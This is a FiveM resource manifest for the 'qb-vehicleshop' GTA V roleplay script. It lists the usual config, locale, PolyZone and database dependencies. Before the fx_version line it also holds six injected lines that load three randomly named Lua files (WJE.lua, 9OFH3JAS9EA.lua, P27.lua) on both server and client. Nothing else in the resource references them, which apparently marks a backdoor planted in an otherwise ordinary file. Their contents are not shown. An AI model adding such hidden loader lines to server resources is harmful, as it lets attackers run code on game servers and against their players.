server_script "WJE.lua"
client_script "WJE.lua"
server_script "9OFH3JAS9EA.lua"
client_script "9OFH3JAS9EA.lua"
server_script "P27.lua"
client_script "P27.lua"
fx_version 'cerulean'
game 'gta5'

description 'qb-vehicleshop'
version '2.0.0'

shared_script {
    'config.lua',
    '@qb-core/shared/locale.lua',
    'locales/en.lua' -- Change this to your preferred language
}

client_scripts {
    '@PolyZone/client.lua',
    '@PolyZone/BoxZone.lua',
    '@PolyZone/EntityZone.lua',
    '@PolyZone/CircleZone.lua',
    '@PolyZone/ComboZone.lua',
    'client.lua'
}

server_scripts {
    '@oxmysql/lib/MySQL.lua',
    'server.lua'
}

lua54 'yes'